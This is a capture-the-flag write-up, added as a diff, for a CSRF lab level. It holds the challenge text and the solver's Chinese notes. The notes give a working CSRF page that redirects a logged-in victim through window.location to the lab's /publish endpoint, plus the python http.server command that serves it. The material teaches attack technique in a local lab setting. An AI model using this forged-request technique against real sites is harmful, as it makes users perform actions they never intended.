@@ -1,0 +1,39 @@
+#CSRF 1
+#挑战简介
+You've used XSS to inject JavaScript to cause the victim to make HTTP requests. But what if there is no XSS? Can you just "inject" the HTTP requests directly?
+
+Shockingly, the answer is yes. The web was designed to enable interconnectivity across many different websites. Sites can embed images from other sites, link to other sites, 
+and even redirect to other sites. All of this flexibility represents some serious security risks, 
+and there is almost nothing preventing a malicious website from simply directly causing a victim visitor to make potentially sensitive requests, such as (in our case) a GET request to http://challenge.localhost/publish!
+
+This style of forging requests across sites is called Cross Site Request Forgery, or CSRF for short.
+
+Note that I said almost nothing prevents this. The Same-origin Policy was created in the 1990s, when the web was still young, to (try to) mitigate this problem. SOP prevents a site at one Origin 
+(say, http://www.hacker.com or, in our case, http://hacker.localhost:1337) from interacting in certain security-critical ways with sites at other Origins (say, http://www.asu.edu or, in our case, http://challenge.localhost/). 
+SOP prevents some common CSRF vectors (e.g., when using JavaScript to make a requests across Origins, cookies will not be sent!), but there are plenty of SOP-avoiding ways to, e.g., 
+make GET requests with cookies intact (such as full-on redirects).
+
+In this level, pwnpost has fixed its XSS issues (at least for the admin user). You'll need to use CSRF to publish the flag post! The /challenge/victim of this level will log into pwnpost (http://challenge.localhost/) 
+and will then visit an evil site that you can set up (http://hacker.localhost:1337/). hacker.localhost points to your local workspace, but you will need to set up a web server to serve an HTTP request on port 1337 yourself. 
+Again, this can be done with nc or with a python server (check out http.server!). Because these sites will have different Origins, SOP protections will apply, so be careful about how you forge the request!
+
+#思路：这题真的抽象完了，主要是这题的html编写img不能用，使得我在img这兜兜转转了很久，结果查了好久的discord，翻了好久的洋文，终于才明白img有问题，可以用window.location...没话说。
+#这题步骤很简单，开启server之后，你需要在你的~页面创建一个index.html。
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+    <script>
+        // 使用 window.location 进行重定向，发送 GET 请求到 /publish
+        window.location = "http://challenge.localhost/publish";
+    </script>
+</head>
+<body>
+    <p>Redirecting to perform CSRF attack...</p>
+</body>
+</html>
+#而后输入指令
+python3 -m http.server 1337
+#用户登录/hacker.location:1337/的时候会自动跳转至/challenge.location:80/publish进行一次GET请求。
+#这时候就可以输入/challenge/victim
